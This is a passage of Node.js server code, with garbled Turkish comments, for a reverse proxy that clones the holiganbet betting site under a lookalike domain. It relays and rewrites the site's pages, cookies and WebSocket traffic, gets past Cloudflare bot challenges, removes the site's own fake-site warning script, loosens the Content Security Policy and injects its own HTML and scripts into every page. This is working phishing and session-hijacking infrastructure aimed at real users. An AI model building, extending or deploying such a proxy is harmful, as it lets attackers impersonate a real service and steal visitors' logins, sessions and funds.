        const cookies = apiSetCookies.map(cookie => {
          return cookie
            .replace(/domain=\.?www\.holiganbet\d+\.com/gi, `domain=${proxyDomain.split(':')[0]}`)
            .replace(/domain=\.?holiganbet\d+\.com/gi, `domain=${proxyDomain.split(':')[0]}`)
            .replace(/;\s*secure/gi, getRealProtocol(req) === 'https' ? '; Secure' : '')
            .replace(/SameSite=None/gi, 'SameSite=Lax');
        });
        res.setHeader('Set-Cookie', cookies);
      }

      res.status(apiStatus);

      // JSON domain rewrite
      if (apiBody && apiBody.length > 0 && apiContentType.includes('application/json')) {
        try {
          let data = apiBody.toString('utf8');
          const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
          const apiRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
          const proxyBase = getProxyBaseDomain(proxyDomain);
          data = data.replace(apiRewriteRegex, (match, protocol, fullDomain) => {
            const targetProtocol = protocol || 'https:';
            const isWs = targetProtocol.startsWith('ws');
            const finalProtocol = isWs 
              ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:')
              : (getRealProtocol(req) + ':');
            const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase, CONFIG.domain.target);
            return `${finalProtocol}//${rewrittenDomain}`;
          });
          res.setHeader('Content-Type', apiContentType);
          return res.send(data);
        } catch (e) {
          console.error('ÔØî API JSON rewrite error:', e.message);
        }
      }

      res.setHeader('Content-Type', apiContentType);
      return res.send(apiBody);
    }

    // HTML HANDLER ÔÇö curl-impersonate ile CF bypass (ham kaynak kodu al─▒r)
    console.log('­şîÉ curl-impersonate fetch:', fullUrl);
    try {
      // CF clearance cookie'yi ├Ânceden al ve Cookie header'a ekle
      const cfCacheFirst = _cfClearanceCache.cookie && Date.now() < _cfClearanceCache.expiresAt ? _cfClearanceCache : await getCfClearance();
      const browserCookie = req.headers.cookie || '';
      let htmlCookie = browserCookie;
      if (cfCacheFirst && cfCacheFirst.cookie) {
        htmlCookie = cfCacheFirst.cookie + (browserCookie ? '; ' + browserCookie : '');
      }
      const curlResult = await curlFetch(fullUrl, {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'identity',
          'Cookie': htmlCookie,
          'Referer': `https://${CONFIG.domain.www}/`,
        }
      });

      // Redirect
      if (curlResult.status >= 300 && curlResult.status < 400 && curlResult.headers['location']) {
        let redirectUrl = curlResult.headers['location'];
        if (redirectUrl.startsWith('http')) {
          try {
            const locationUrl = new URL(redirectUrl);
            if (locationUrl.hostname.includes(CONFIG.domain.target)) {
              locationUrl.hostname = proxyDomain.split(':')[0];
              locationUrl.protocol = getRealProtocol(req) + ':';
              redirectUrl = locationUrl.pathname + locationUrl.search + locationUrl.hash;
            }
          } catch(e) {}
        }
        return res.redirect(curlResult.status, redirectUrl);
      }

      if (curlResult.status === 200 && curlResult.body.length > 500) {
        let html = curlResult.body;
        
        // Domain rewrite (subdomain-preserving)
        const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
        const proxyBase = getProxyBaseDomain(proxyDomain);
        const fullRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
        html = html.replace(fullRewriteRegex, (match, protocol, fullDomain) => {
          const targetProtocol = protocol || 'https:';
          const isWs = targetProtocol.startsWith('ws');
          const finalProtocol = isWs 
            ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:')
            : (getRealProtocol(req) + ':');
          const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase, CONFIG.domain.target);
          return `${finalProtocol}//${rewrittenDomain}`;
        });

        // Bare domain rewrite (hostname:"holiganbet7602.com" ÔåÆ "xn--artemsbet1200-0ib.com")
        html = html.replaceAll(`hostname:"${CONFIG.domain.target}"`, `hostname:"${proxyBase}"`);
        html = html.replaceAll(`hostname: "${CONFIG.domain.target}"`, `hostname: "${proxyBase}"`);
        
        // NOT: holiganbet.com (rakams─▒z) realm de─şerini rewrite ETM─░YORUZ
        // WAMP protocol realm olarak "http://www.holiganbet.com" bekliyor, de─şi┼ştirirsek "Invalid realm" hatas─▒ al─▒n─▒r

        // URL-encoded domain rewrite (basePath=https%3A%2F%2Fwww.holiganbet7602.com vb.)
        const encodedTargetHttps = encodeURIComponent(`https://www.${CONFIG.domain.target}`);
        const encodedTargetHttp = encodeURIComponent(`http://www.${CONFIG.domain.target}`);
        const encodedProxy = encodeURIComponent(`${getRealProtocol(req)}://www.${proxyBase}`);
        html = html.replaceAll(encodedTargetHttps, encodedProxy);
        html = html.replaceAll(encodedTargetHttp, encodedProxy);
        
        // Genel URL-encoded domain rewrite (sports2, sportsapi vb. subdomain'ler i├ğin)
        const encodedTargetDomain = encodeURIComponent(CONFIG.domain.target);
        const encodedProxyDomain = encodeURIComponent(proxyBase);
        // Sadece URL-encoded context'lerde (%3A%2F%2F ile birlikte) de─şi┼ştir
        html = html.replaceAll(`%2F%2Fsports2.${encodedTargetDomain}`, `%2F%2Fsports2.${encodedProxyDomain}`);
        html = html.replaceAll(`%2F%2Fsportsapi.${encodedTargetDomain}`, `%2F%2Fsportsapi.${encodedProxyDomain}`);
        html = html.replaceAll(`%2F%2Fapi.${encodedTargetDomain}`, `%2F%2Fapi.${encodedProxyDomain}`);
        
        // HTTP ÔåÆ HTTPS upgrade (proxy her zaman HTTPS kullan─▒r)
        // Orijinal site HTTP kullanabilir, proxy'de mixed content sorununu ├Ânle
        html = html.replaceAll(`http://sports2.${proxyBase}`, `https://sports2.${proxyBase}`);
        html = html.replaceAll(`http://sportsapi.${proxyBase}`, `https://sportsapi.${proxyBase}`);
        html = html.replaceAll(`http://www.${proxyBase}`, `https://www.${proxyBase}`);
        html = html.replaceAll(`http://api.${proxyBase}`, `https://api.${proxyBase}`);
        html = html.replaceAll(`http://m.${proxyBase}`, `https://m.${proxyBase}`);
        html = html.replaceAll(`http://gamelaunch.${proxyBase}`, `https://gamelaunch.${proxyBase}`);

        // Turnstile script'lerini KALDIRMA
        
        // CF challenge platform script'ini kald─▒r (Internal Server Error code 53129 sorunu)
        // Bu script proxy ortam─▒nda ├ğal─▒┼şm─▒yor ve sayfa hatas─▒na neden oluyor
        // <script> ile </script> aras─▒nda ba┼şka <script> tag'i olmayan, challenge-platform i├ğeren blo─şu kald─▒r
        html = html.replace(/<script>(?:(?!<script>)[\s\S])*?challenge-platform[\s\S]*?<\/script>/gi, '');
        html = html.replace(/<script>(?:(?!<script>)[\s\S])*?__CF\$cv\$params[\s\S]*?<\/script>/gi, '');
        
        // hook.talep.cc domain-check script'ini kald─▒r (sahte site uyar─▒s─▒n─▒ engellemek i├ğin)
        html = html.replace(/<script[^>]*src=["'][^"']*hook\.talep\.cc[^"']*["'][^>]*><\/script>/gi, '');
        html = html.replace(/<script[^>]*src=["'][^"']*domain-check\/check\.js[^"']*["'][^>]*><\/script>/gi, '');
        // Inline domain check kodu varsa onu da kald─▒r
        html = html.replace(/<script[^>]*id=["']er_\d+["'][^>]*src=["'][^"']*check\.js[^"']*["'][^>]*><\/script>/gi, '');
        
        const cspMeta = '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\' blob: data:; connect-src *;">';
        html = html.replace(/<\/head>/i, cspMeta + getHtmlInjections(proxyDomain) + '</head>');

        // Set-Cookie forwarding
        if (curlResult.headers['set-cookie']) {
          const cookies = curlResult.headers['set-cookie'].split('\n').map(c => 
            c.replace(new RegExp(`domain=[.]?[\\w.-]*${domainPattern}`, 'gi'), `domain=.${proxyBase}`)
             .replace(/;\s*secure/gi, getRealProtocol(req) === 'https' ? '; Secure' : '')
          );
          res.setHeader('Set-Cookie', cookies);
        }

        res.setHeader('Content-Security-Policy', "frame-src *; frame-ancestors *; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; connect-src *;");
        res.setHeader("Content-Type", curlResult.headers['content-type'] || "text/html; charset=utf-8");
        
        return res.status(200).send(html);
      }

      // curl-impersonate de ba┼şar─▒s─▒zsa, CF challenge ya da hata sayfas─▒
      console.error('ÔØî curl-impersonate HTML ba┼şar─▒s─▒z, status:', curlResult.status);
    } catch (curlErr) {
      console.error('ÔØî curl-impersonate HTML hatas─▒:', curlErr.message);
    }

    // Fallback 1: IUAM bypass ÔÇö cf_clearance cookie ile normal fetch
    try {
      const clearance = await getCfClearance();
      if (clearance) {
        const existingCookie = req.headers.cookie || '';
        const mergedCookie = existingCookie ? `${clearance.cookie}; ${existingCookie}` : clearance.cookie;
        const iuamResponse = await fetchWithRetry(fullUrl, {
          headers: {
            ...headers,
            'Cookie': mergedCookie,
            'User-Agent': clearance.userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          }
        });
        if (iuamResponse.ok) {
          const iuamHtml = await iuamResponse.text();
          if (iuamHtml.length > 500 && !iuamHtml.includes('Just a moment') && !iuamHtml.includes('challenge-platform')) {
            console.log('Ô£à IUAM fallback success for:', req.url.substring(0, 80));
            const domainPattern2 = CONFIG.domain.target.replace(/\./g, '\\.');
            const proxyBase2 = getProxyBaseDomain(proxyDomain);
            let html2 = iuamHtml;
            const fullRewriteRegex2 = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern2})`, 'gi');
            html2 = html2.replace(fullRewriteRegex2, (match, protocol, fullDomain) => {
              const targetProtocol = protocol || 'https:';
              const isWs = targetProtocol.startsWith('ws');
              const finalProtocol = isWs ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:') : (getRealProtocol(req) + ':');
              const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase2, CONFIG.domain.target);
              return `${finalProtocol}//${rewrittenDomain}`;
            });
            html2 = html2.replace(/<script>(?:(?!<script>)[\s\S])*?challenge-platform[\s\S]*?<\/script>/gi, '');
            html2 = html2.replace(/<script>(?:(?!<script>)[\s\S])*?__CF\$cv\$params[\s\S]*?<\/script>/gi, '');
            html2 = html2.replace(/<script[^>]*src=["'][^"']*hook\.talep\.cc[^"']*["'][^>]*><\/script>/gi, '');
            const cspMeta2 = '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\' blob: data:; connect-src *;">';
            html2 = html2.replace(/<\/head>/i, cspMeta2 + getHtmlInjections(proxyDomain) + '</head>');
            res.setHeader('Content-Security-Policy', "frame-src *; frame-ancestors *; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; connect-src *;");
            res.setHeader('Content-Type', iuamResponse.headers.get('content-type') || 'text/html; charset=utf-8');
            return res.status(200).send(html2);
          } else {
            // Cookie expired, clear cache and try to refresh next request
            _cfClearanceCache = { cookie: null, userAgent: null, expiresAt: 0 };
          }
        }
      }
    } catch (iuamErr) {
      console.error('ÔØî IUAM fetch hatas─▒:', iuamErr.message);
    }

    // Fallback 2: normal fetchWithRetry
    const response = await fetchWithRetry(fullUrl, { headers });
    
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get('location');
      if (location) {
        let redirectUrl = location;
        
        if (location.startsWith('http')) {
          try {
            const locationUrl = new URL(location);
            if (locationUrl.hostname.includes(CONFIG.domain.target)) {
              locationUrl.hostname = proxyDomain.split(':')[0];
              locationUrl.protocol = getRealProtocol(req) + ':';
              redirectUrl = locationUrl.pathname + locationUrl.search + locationUrl.hash;
            }
          } catch(e) {}
        }
        
        return res.redirect(response.status, redirectUrl);
      }
    }
    
    if (!response.ok) {
      const errorContentType = response.headers.get("content-type") || "";
      if (errorContentType.includes("text/html")) {
        let errorHtml = await response.text();
        
        // CF challenge tespit et ÔÇö curl-impersonate ile ham kaynak kodu al
        if (errorHtml.includes('challenge-platform') || errorHtml.includes('Just a moment')) {
          console.log('­şöä CF challenge tespit edildi, curl-impersonate ile ger├ğek sayfa al─▒n─▒yor:', fullUrl);
          try {
            const curlResult = await curlFetch(fullUrl, {
              headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'identity',
                'Cookie': req.headers.cookie || '',
              }
            });
            
            if (curlResult.status === 200 && curlResult.body.length > 1000 && !curlResult.body.includes('challenge-platform')) {
              console.log('Ô£à curl-impersonate ba┼şar─▒l─▒! HTML boyutu:', curlResult.body.length);
              let html = curlResult.body;
              
              // Domain rewrite
              const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
              const fullRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
              html = html.replace(fullRewriteRegex, (match, protocol) => {
                const targetProtocol = protocol || 'https:';
                const isWs = targetProtocol.startsWith('ws');
                const finalProtocol = isWs 
                  ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:')
                  : (getRealProtocol(req) + ':');
                return `${finalProtocol}//${proxyDomain}`;
              });
              
              // hook.talep.cc domain-check script'ini kald─▒r
              html = html.replace(/<script[^>]*src=["'][^"']*hook\.talep\.cc[^"']*["'][^>]*><\/script>/gi, '');
              html = html.replace(/<script[^>]*src=["'][^"']*domain-check\/check\.js[^"']*["'][^>]*><\/script>/gi, '');
              html = html.replace(/<script[^>]*id=["']er_\d+["'][^>]*src=["'][^"']*check\.js[^"']*["'][^>]*><\/script>/gi, '');
              
              const cspMeta = '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\' blob: data:; connect-src *;">';
              html = html.replace(/<\/head>/i, cspMeta + getHtmlInjections(proxyDomain) + '</head>');
              
              res.setHeader('Content-Security-Policy', "frame-src *; frame-ancestors *; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; connect-src *;");
              res.setHeader("Content-Type", "text/html; charset=utf-8");
              return res.status(200).send(html);
            } else {
              console.error('ÔØî curl-impersonate ba┼şar─▒s─▒z, status:', curlResult.status, 'size:', curlResult.body.length);
            }
          } catch (curlErr) {
            console.error('ÔØî curl-impersonate hatas─▒:', curlErr.message);
          }
        }
        
        // curl-impersonate ba┼şar─▒s─▒zsa veya challenge de─şilse, mevcut error HTML'i g├Âster
        const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
        const proxyHost = proxyDomain.split(':')[0];
        
        const proxyBase = getProxyBaseDomain(proxyDomain);
        const fullRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
        errorHtml = errorHtml.replace(fullRewriteRegex, (match, protocol, fullDomain) => {
          const targetProtocol = protocol || 'https:';
          const isWs = targetProtocol.startsWith('ws');
          const finalProtocol = isWs 
            ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:')
            : (getRealProtocol(req) + ':');
          const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase, CONFIG.domain.target);
          return `${finalProtocol}//${rewrittenDomain}`;
        });
        errorHtml = errorHtml.replaceAll(`hostname:"${CONFIG.domain.target}"`, `hostname:"${proxyBase}"`);
        errorHtml = errorHtml.replaceAll(`hostname: "${CONFIG.domain.target}"`, `hostname: "${proxyBase}"`);
        
        // hook.talep.cc domain-check script'ini kald─▒r (sahte site uyar─▒s─▒)
        errorHtml = errorHtml.replace(/<script[^>]*src=["'][^"']*hook\.talep\.cc[^"']*["'][^>]*><\/script>/gi, '');
        errorHtml = errorHtml.replace(/<script[^>]*src=["'][^"']*domain-check\/check\.js[^"']*["'][^>]*><\/script>/gi, '');
        errorHtml = errorHtml.replace(/<script[^>]*id=["']er_\d+["'][^>]*src=["'][^"']*check\.js[^"']*["'][^>]*><\/script>/gi, '');
        
        const challengeCsp = '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\' blob: data:; connect-src *;">';
        errorHtml = errorHtml.replace(/<\/head>/i, challengeCsp + getHtmlInjections(proxyDomain) + '</head>');
        res.setHeader('Content-Security-Policy', "frame-src *; frame-ancestors *; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; connect-src *;");
        res.setHeader("Content-Type", "text/html; charset=utf-8");
        return res.status(response.status).send(errorHtml);
      }
      return res.status(response.status).send("Page Error");
    }

    let html = await response.text();

    const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
    const fullRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
    
    const proxyBase2 = getProxyBaseDomain(proxyDomain);
    html = html.replace(fullRewriteRegex, (match, protocol, fullDomain) => {
      const targetProtocol = protocol || 'https:';
      const isWs = targetProtocol.startsWith('ws');
      const finalProtocol = isWs 
        ? (getRealProtocol(req) === 'https' ? 'wss:' : 'ws:')
        : (getRealProtocol(req) + ':');
      const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase2, CONFIG.domain.target);
      return `${finalProtocol}//${rewrittenDomain}`;
    });
    html = html.replaceAll(`hostname:"${CONFIG.domain.target}"`, `hostname:"${proxyBase2}"`);
    html = html.replaceAll(`hostname: "${CONFIG.domain.target}"`, `hostname: "${proxyBase2}"`);
    
    // Turnstile script'lerini KALDIRMA - CF challenge y├╝klensin, tunnel script Origin/Referer d├╝zeltecek
    // html = html.replace(/<script[^>]*src=["'][^"']*challenges\.cloudflare\.com\/turnstile[^"']*["'][^>]*><\/script>/gi, '');
    
    // hook.talep.cc domain-check script'ini kald─▒r (sahte site uyar─▒s─▒)
    html = html.replace(/<script[^>]*src=["'][^"']*hook\.talep\.cc[^"']*["'][^>]*><\/script>/gi, '');
    html = html.replace(/<script[^>]*src=["'][^"']*domain-check\/check\.js[^"']*["'][^>]*><\/script>/gi, '');
    html = html.replace(/<script[^>]*id=["']er_\d+["'][^>]*src=["'][^"']*check\.js[^"']*["'][^>]*><\/script>/gi, '');
    
    const cspMeta = '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\' blob: data:; connect-src *;">';
    html = html.replace(/<\/head>/i, cspMeta + getHtmlInjections(proxyDomain) + '</head>');

    res.setHeader('Content-Security-Policy', "frame-src *; frame-ancestors *; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; connect-src *;");
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.send(html);

  } catch (err) {
    console.error("ÔØî Error:", err.message);
    res.status(500).send(`Error: ${err.message}`);
  }
});

// ============= WEBSOCKET PROXY =============
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

server.on("upgrade", (req, socket, head) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`\n­şöî WS UPGRADE from ${clientIp}: ${req.url}`);
  
  try {
    const hostHeader = req.headers.host || '';
    const hostname = hostHeader.split(':')[0].toLowerCase();
    
    let wsTargetHost = CONFIG.domain.api;
    
    if (hostname.startsWith('sportsapi.')) {
      wsTargetHost = CONFIG.domain.sportsapi;
    } else if (hostname.startsWith('sports2.')) {
      wsTargetHost = CONFIG.domain.sports2;
    } else if (hostname.startsWith('api.')) {
      wsTargetHost = CONFIG.domain.api;
    } else if (hostname.startsWith('gamelaunch.')) {
      wsTargetHost = CONFIG.domain.gamelaunch;
    }
    
    let finalPath = req.url || '/v2';
    if (finalPath === '/' || finalPath === '') finalPath = '/v2';
    
    const wsTarget = `wss://${wsTargetHost}${finalPath}`;
    console.log(`­şöî Target: ${wsTarget}`);
    
    const wsOptions = {
      headers: {
        'Host': wsTargetHost,
        'Origin': `https://${CONFIG.domain.www}`,
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Cookie': req.headers.cookie || '',
        'Accept-Language': req.headers['accept-language'] || 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
      },
      rejectUnauthorized: false,
      handshakeTimeout: 15000,
    };

    if (CONFIG.proxy.enabled && CONFIG.proxy.enableForWebSocket) {
      const auth = `${CONFIG.proxy.username}:${CONFIG.proxy.password}`;
      const proxyUrl = `http://${auth}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`;
      wsOptions.agent = new HttpsProxyAgent(proxyUrl);
    }

    const clientProtocols = req.headers['sec-websocket-protocol'];
    let protocols = undefined;
    if (clientProtocols) {
      protocols = clientProtocols.split(',').map(p => p.trim());
    }

    const targetWs = protocols && protocols.length > 0
      ? new WebSocket(wsTarget, protocols, wsOptions)
      : new WebSocket(wsTarget, wsOptions);
    
    let connectionEstablished = false;
    
    const connectionTimeout = setTimeout(() => {
      if (!connectionEstablished) {
        console.error("ÔÅ▒´©Å WS timeout");
        targetWs.terminate();
        socket.destroy();
      }
    }, 30000);

    targetWs.on("open", () => {
      connectionEstablished = true;
      clearTimeout(connectionTimeout);
      console.log("Ô£à Target WS connected");
      
      wss.handleUpgrade(req, socket, head, (clientWs) => {
        console.log("Ô£à Client WS upgraded");
        
        const pingInterval = setInterval(() => {
          if (clientWs.readyState === WebSocket.OPEN && targetWs.readyState === WebSocket.OPEN) {
            try { targetWs.ping(); } catch(e) { clearInterval(pingInterval); }
          } else {
            clearInterval(pingInterval);
          }
        }, 25000);
        
        clientWs.on('message', (data, isBinary) => {
          if (targetWs.readyState === WebSocket.OPEN) {
            try {
              // DEBUG: ClientÔåÆTarget ilk birka├ğ mesaj─▒ logla
              if (!isBinary) {
                const msgText = data.toString('utf8');
                if (msgText.startsWith('[1,') || msgText.includes('error') || msgText.includes('Error')) {
                  console.log('­şôñ WS CLIENT MSG:', msgText.substring(0, 300));
                }
              }
              targetWs.send(data, { binary: isBinary });
            } catch(e) {}
          }
        });
        
        clientWs.on('close', (code, reason) => {
          console.log(`­şöî Client closed: ${code}`);
          clearInterval(pingInterval);
          if (targetWs.readyState === WebSocket.OPEN || targetWs.readyState === WebSocket.CONNECTING) {
            try { targetWs.close(1000); } catch(e) { targetWs.terminate(); }
          }
        });
        
        clientWs.on('error', (err) => {
          console.error("ÔØî Client WS error:", err.message);
          clearInterval(pingInterval);
          if (targetWs.readyState === WebSocket.OPEN) targetWs.close();
        });
        
        targetWs.on('message', (data, isBinary) => {
          if (clientWs.readyState === WebSocket.OPEN) {
            try {
              // Text mesajlarda domain rewrite
              if (!isBinary) {
                let text = data.toString('utf8');
                // DEBUG: WS mesajlar─▒nda hata/error i├ğerenleri logla
                if (text.includes('error') || text.includes('Error') || text.includes('53129') || text.includes('Internal')) {
                  console.log('­şö┤ WS ERROR MSG:', text.substring(0, 500));
                }
                if (text.includes(CONFIG.domain.target)) {
                  const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
                  const wsRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
                  text = text.replace(wsRewriteRegex, (match, protocol, fullDomain) => {
                    const targetProtocol = protocol || 'wss:';
                    const isWs = targetProtocol.startsWith('ws');
                    const proxyDomain = hostHeader || `localhost:${PORT}`;
                    const proxyBase = getProxyBaseDomain(proxyDomain);
                    const finalProtocol = isWs ? 'wss:' : 'https:';
                    const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase, CONFIG.domain.target);
                    return `${finalProtocol}//${rewrittenDomain}`;
                  });
                  clientWs.send(text);
                } else {
                  clientWs.send(data, { binary: isBinary });
                }
              } else {
                clientWs.send(data, { binary: isBinary });
              }
            } catch(e) {}
          }
        });
        
        targetWs.on('close', (code, reason) => {
          console.log(`­şöî Target closed: ${code}`);
          clearInterval(pingInterval);
          if (clientWs.readyState === WebSocket.OPEN || clientWs.readyState === WebSocket.CONNECTING) {
            try { clientWs.close(code || 1000); } catch(e) { clientWs.terminate(); }
          }
        });
        
        targetWs.on('error', (err) => {
          console.error("ÔØî Target WS error:", err.message);
          clearInterval(pingInterval);
          if (clientWs.readyState === WebSocket.OPEN) clientWs.close();
        });
      });
    });

    targetWs.on("error", (err) => {
      clearTimeout(connectionTimeout);
      console.error("ÔØî Target WS error:", err.message);
      
      if (!connectionEstablished) {
        // 403 hatas─▒ al─▒n─▒rsa tekrar dene (CF engellemesi)
        if (err.message.includes('403') && !wsOptions._retried) {
          wsOptions._retried = true;
          console.log("­şöä WS 403, retrying with different proxy IP...");
          
          // Yeni proxy ba─şlant─▒s─▒ ile tekrar dene
          setTimeout(() => {
            try {
              const retryProtocols = protocols && protocols.length > 0 ? protocols : undefined;
              const retryTargetWs = retryProtocols
                ? new WebSocket(wsTarget, retryProtocols, wsOptions)
                : new WebSocket(wsTarget, wsOptions);
              
              const retryTimeout = setTimeout(() => {
                console.error("ÔÅ▒´©Å WS retry timeout");
                retryTargetWs.terminate();
                socket.destroy();
              }, 15000);
              
              retryTargetWs.on("open", () => {
                clearTimeout(retryTimeout);
                console.log("Ô£à Target WS connected (retry)");
                
                wss.handleUpgrade(req, socket, head, (clientWs) => {
                  console.log("Ô£à Client WS upgraded (retry)");
                  
                  const pingInterval = setInterval(() => {
                    if (clientWs.readyState === WebSocket.OPEN && retryTargetWs.readyState === WebSocket.OPEN) {
                      try { retryTargetWs.ping(); } catch(e) { clearInterval(pingInterval); }
                    } else {
                      clearInterval(pingInterval);
                    }
                  }, 25000);
                  
                  clientWs.on('message', (data, isBinary) => {
                    if (retryTargetWs.readyState === WebSocket.OPEN) {
                      try { retryTargetWs.send(data, { binary: isBinary }); } catch(e) {}
                    }
                  });
                  
                  clientWs.on('close', (code, reason) => {
                    clearInterval(pingInterval);
                    if (retryTargetWs.readyState === WebSocket.OPEN || retryTargetWs.readyState === WebSocket.CONNECTING) {
                      try { retryTargetWs.close(1000); } catch(e) { retryTargetWs.terminate(); }
                    }
                  });
                  
                  clientWs.on('error', (err) => {
                    clearInterval(pingInterval);
                    if (retryTargetWs.readyState === WebSocket.OPEN) retryTargetWs.close();
                  });
                  
                  retryTargetWs.on('message', (data, isBinary) => {
                    if (clientWs.readyState === WebSocket.OPEN) {
                      try {
                        if (!isBinary) {
                          let text = data.toString('utf8');
                          if (text.includes(CONFIG.domain.target)) {
                            const domainPattern = CONFIG.domain.target.replace(/\./g, '\\.');
                            const wsRewriteRegex = new RegExp(`(https?:|wss?:)?\\/\\/((?:www\\.|m\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|gamelaunch\\.)?${domainPattern})`, 'gi');
                            text = text.replace(wsRewriteRegex, (match, protocol, fullDomain) => {
                              const targetProtocol = protocol || 'wss:';
                              const isWs = targetProtocol.startsWith('ws');
                              const proxyDomain = hostHeader || `localhost:${PORT}`;
                              const proxyBase = getProxyBaseDomain(proxyDomain);
                              const finalProtocol = isWs ? 'wss:' : 'https:';
                              const rewrittenDomain = rewriteDomainPreservingSubdomain(fullDomain, proxyBase, CONFIG.domain.target);
                              return `${finalProtocol}//${rewrittenDomain}`;
                            });
                            clientWs.send(text);
                          } else {
                            clientWs.send(data, { binary: isBinary });
                          }
                        } else {
                          clientWs.send(data, { binary: isBinary });
                        }
                      } catch(e) {}
                    }
                  });
                  
                  retryTargetWs.on('close', (code) => {
                    clearInterval(pingInterval);
                    if (clientWs.readyState === WebSocket.OPEN || clientWs.readyState === WebSocket.CONNECTING) {
                      try { clientWs.close(code || 1000); } catch(e) { clientWs.terminate(); }
                    }
                  });
                  
                  retryTargetWs.on('error', (err) => {
                    clearInterval(pingInterval);
                    if (clientWs.readyState === WebSocket.OPEN) clientWs.close();
                  });
                });
              });
              
              retryTargetWs.on("error", (err2) => {
                clearTimeout(retryTimeout);
                console.error("ÔØî WS retry also failed:", err2.message);
                try {
                  socket.write('HTTP/1.1 502 Bad Gateway\r\n\r\n');
                  socket.destroy();
                } catch(e) {
                  socket.destroy();
                }
              });
            } catch(e) {
              socket.destroy();
            }
          }, 500);
          return;
        }
        
        try {
          socket.write('HTTP/1.1 502 Bad Gateway\r\n\r\n');
          socket.destroy();
        } catch(e) {
          socket.destroy();
        }
      }
    });

  } catch (err) {
    console.error("ÔØî WS upgrade error:", err.message);
    try {
      socket.write('HTTP/1.1 500 Internal Server Error\r\n\r\n');
      socket.destroy();
    } catch(e) {
      socket.destroy();
    }
  }
});

server.listen(PORT, () => {
  console.log(`
ÔòöÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòù
Ôòæ  ­şÄ» Holiganbet Proxy Active            Ôòæ
